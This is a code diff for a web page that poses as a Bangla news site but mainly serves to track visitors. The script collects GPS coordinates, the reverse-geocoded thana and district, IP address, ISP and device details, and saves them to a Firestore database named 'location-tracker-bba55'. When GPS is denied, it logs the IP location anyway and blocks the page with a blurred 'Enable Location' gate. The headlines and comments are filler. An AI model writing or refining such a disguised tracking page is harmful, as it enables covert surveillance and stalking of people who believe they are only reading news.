@@ -31,7 +31,6 @@ width:100%;
 height:150px;
 object-fit:cover;
 border-radius:6px;
-background:#ddd;
 }
 
 #articlePage{display:none;}
@@ -43,11 +42,12 @@ background:#ddd;
 .ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
 .footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}
 
-/* GATE */
+/* LOCATION GATE */
 #locationGate{
 position:fixed;
 top:0;left:0;
 width:100%;height:100%;
+backdrop-filter:blur(6px);
 background:rgba(0,0,0,0.4);
 display:none;
 justify-content:center;
@@ -60,8 +60,9 @@ background:white;
 padding:25px;
 border-radius:12px;
 width:90%;
-max-width:320px;
+max-width:340px;
 text-align:center;
+box-shadow:0 10px 30px rgba(0,0,0,0.2);
 }
 
 .gate-box button{
@@ -71,17 +72,24 @@ background:#ff4b5c;
 color:white;
 border:none;
 border-radius:6px;
+font-size:16px;
 margin-top:10px;
+cursor:pointer;
+}
+
+.card img{
+background:#ddd;
 }
 </style>
 </head>
 
 <body>
 
+<!-- LOCATION GATE -->
 <div id="locationGate">
 <div class="gate-box">
-<h3>📍 Enable Location</h3>
-<p id="gateMsg">Enable location to continue</p>
+<h2>📍 Enable Location</h2>
+<p>আপনার এলাকার খবর দেখতে location চালু করুন</p>
 <button onclick="retryLocation()">Enable Location</button>
 </div>
 </div>
@@ -96,6 +104,7 @@ margin-top:10px;
 </nav>
 
 <div class="container">
+
 <div id="homePage">
 <div class="ad">📢 Advertisement</div>
 <div id="newsContainer" class="grid"></div>
@@ -116,6 +125,7 @@ margin-top:10px;
 </div>
 
 </div>
+
 </div>
 
 <div class="footer">© 2026 Daily News</div>
@@ -133,7 +143,7 @@ projectId:"location-tracker-bba55"
 
 const db = getFirestore(app);
 
-// USER
+// USER ID
 function getUserId(){
 let id = localStorage.getItem("userId")
 if(!id){
@@ -146,13 +156,15 @@ return id
 // DEVICE
 function detectDevice(){
 let ua=navigator.userAgent;
-return /mobile/i.test(ua) ? "Mobile" : "Desktop";
+if(/mobile/i.test(ua)) return "Mobile";
+if(/tablet/i.test(ua)) return "Tablet";
+return "Desktop";
 }
 
 function detectDeviceModel(){
 let ua=navigator.userAgent;
-if(ua.includes("Android")) return "Android";
-if(ua.includes("Windows")) return "Windows";
+if(ua.includes("Android")) return "Android Phone";
+if(ua.includes("Windows")) return "Windows PC";
 if(ua.includes("Mac")) return "Mac";
 return "Unknown";
 }
@@ -160,13 +172,13 @@ return "Unknown";
 // LOCATION DETAILS
 async function getLocationDetails(lat, lon){
 try{
-let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
-let data = await res.json()
+const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+const data = await res.json()
 let a = data.address
 
 return {
-thana:a.suburb || a.village || "unknown",
-district:a.state_district || "unknown"
+thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
+district: a.state_district || a.county || "unknown"
 }
 }catch{
 return {thana:"unknown",district:"unknown"}
@@ -176,8 +188,13 @@ return {thana:"unknown",district:"unknown"}
 // IP
 async function getIP(){
 let res = await fetch("https://ipinfo.io/json")
-let d = await res.json()
-return {ip:d.ip,org:d.org,country:d.country}
+let data = await res.json()
+
+return {
+ip:data.ip,
+org:data.org,
+country:data.country
+}
 }
 
 // SAVE
@@ -187,6 +204,7 @@ await setDoc(doc(db,"locations",getUserId()), data)
 
 // GPS
 async function handleGPS(pos){
+
 let lat = pos.coords.latitude
 let lon = pos.coords.longitude
 
@@ -206,10 +224,12 @@ deviceModel:detectDeviceModel(),
 type:"GPS",
 time:new Date().toLocaleString()
 })
+
 }
 
 // IP fallback
 async function handleIP(){
+
 let ip = await getIP()
 
 save({
@@ -221,55 +241,20 @@ deviceModel:detectDeviceModel(),
 type:"IP",
 time:new Date().toLocaleString()
 })
+
 }
 
-// SMART AUTO
-let tried = false
-
+// AUTO FLOW
 function autoDetect(){
-
 navigator.geolocation.getCurrentPosition(
 pos=>{
 handleGPS(pos)
 },
-err=>{
-
-if(!tried){
-tried = true
-
-navigator.geolocation.getCurrentPosition(
-pos=>handleGPS(pos),
-()=>showGate(err)
-)
-
-}else{
-showGate(err)
-}
-
-}
-)
-
-}
-
-function showGate(err){
-
+()=>{
 handleIP()
-
 document.getElementById("locationGate").style.display="flex"
-
-if(err.code === 1){
-document.getElementById("gateMsg").innerText =
-"Allow location permission"
 }
-else if(err.code === 2){
-document.getElementById("gateMsg").innerText =
-"Turn ON device location (GPS)"
-}
-else{
-document.getElementById("gateMsg").innerText =
-"Enable location to continue"
-}
-
+)
 }
 
 // RETRY
@@ -283,16 +268,16 @@ handleGPS(pos)
 err=>{
 
 if(err.code === 1){
-document.getElementById("gateMsg").innerText =
-"Allow location permission"
+alert("Permission blocked. Please allow location from browser settings.")
 }
 else if(err.code === 2){
-document.getElementById("gateMsg").innerText =
-"Turn ON device location (GPS)"
+alert("Please turn ON your device location (GPS) and try again.")
+}
+else if(err.code === 3){
+alert("Location request timed out. Try again.")
 }
 else{
-document.getElementById("gateMsg").innerText =
-"Try again"
+alert("Unable to get location.")
 }
 
 }
@@ -300,40 +285,81 @@ document.getElementById("gateMsg").innerText =
 
 }
 
-// NEWS
-const newsData=[
-{title:"ঢাকায় বৃষ্টি",image:"https://images.unsplash.com/photo-1500375592092-40eb2168fd21",summary:"বৃষ্টির সম্ভাবনা"},
-{title:"বাংলাদেশ জয়",image:"https://images.unsplash.com/photo-1540747913346-19e32dc3e97e",summary:"দারুণ জয়"},
-{title:"নতুন ফোন",image:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9",summary:"নতুন মডেল"},
-{title:"ডলার বাড়ছে",image:"https://images.unsplash.com/photo-1567427017947-545c5f8d16ad",summary:"অর্থনীতি"},
-{title:"যানজট",image:"https://images.unsplash.com/photo-1502877338535-766e1452684a",summary:"সমস্যা বাড়ছে"}
+// 🔥 BANGLA NEWS
+const newsData = [
+{
+title:"ঢাকায় আবারও বৃষ্টির পূর্বাভাস",
+image:"https://images.unsplash.com/photo-1500375592092-40eb2168fd21",
+summary:"আগামী ২৪ ঘণ্টায় ভারী বৃষ্টির সম্ভাবনা রয়েছে"
+},
+{
+title:"বাংলাদেশের জয়",
+image:"https://images.unsplash.com/photo-1540747913346-19e32dc3e97e",
+summary:"নাটকীয় জয়ে সিরিজ জিতলো বাংলাদেশ"
+},
+{
+title:"নতুন ফোন বাজারে",
+image:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9",
+summary:"নতুন ফিচার নিয়ে বাজারে এসেছে ফোন"
+},
+{
+title:"ডলার বাড়ছে",
+image:"https://images.unsplash.com/photo-1567427017947-545c5f8d16ad",
+summary:"বাজারে প্রভাব পড়ছে"
+},
+{
+title:"ঢাকায় যানজট",
+image:"https://images.unsplash.com/photo-1502877338535-766e1452684a",
+summary:"মানুষ ভোগান্তিতে"
+},
+{
+title:"AI প্রযুক্তি চমক",
+image:"https://images.unsplash.com/photo-1677442136019-21780ecad995",
+summary:"বিশ্বে নতুন উদ্ভাবন"
+}
 ]
 
-// LOAD
+// LOAD NEWS
 function loadNews(){
-let c=document.getElementById("newsContainer")
-c.innerHTML=""
+let container=document.getElementById("newsContainer")
+container.innerHTML=""
+
 newsData.forEach((n,i)=>{
-let d=document.createElement("div")
-d.className="card"
-d.innerHTML=`<img src="${n.image}"><h4>${n.title}</h4>`
-d.onclick=()=>openArticle(i)
-c.appendChild(d)
+let div=document.createElement("div")
+div.className="card"
+div.innerHTML=`<img src="${n.image}"><h4>${n.title}</h4>`
+div.onclick=()=>openArticle(i)
+container.appendChild(div)
 })
 }
 
+// ARTICLE
 window.openArticle=function(i){
 let n=newsData[i]
-homePage.style.display="none"
-articlePage.style.display="block"
-title.innerText=n.title
-image.src=n.image
-content.innerText=n.summary
+document.getElementById("homePage").style.display="none"
+document.getElementById("articlePage").style.display="block"
+document.getElementById("title").innerText=n.title
+document.getElementById("image").src=n.image
+document.getElementById("content").innerText=n.summary
+loadComments()
 }
 
 window.showHome=function(){
-homePage.style.display="block"
-articlePage.style.display="none"
+document.getElementById("homePage").style.display="block"
+document.getElementById("articlePage").style.display="none"
+}
+
+// COMMENTS
+function loadComments(){
+let arr=["দারুণ!","খুব ভালো","ধন্যবাদ"]
+let list=document.getElementById("commentList")
+list.innerHTML=""
+arr.forEach(c=>{
+let d=document.createElement("div")
+d.className="comment"
+d.innerText=c
+list.appendChild(d)
+})
 }
 
 // INIT
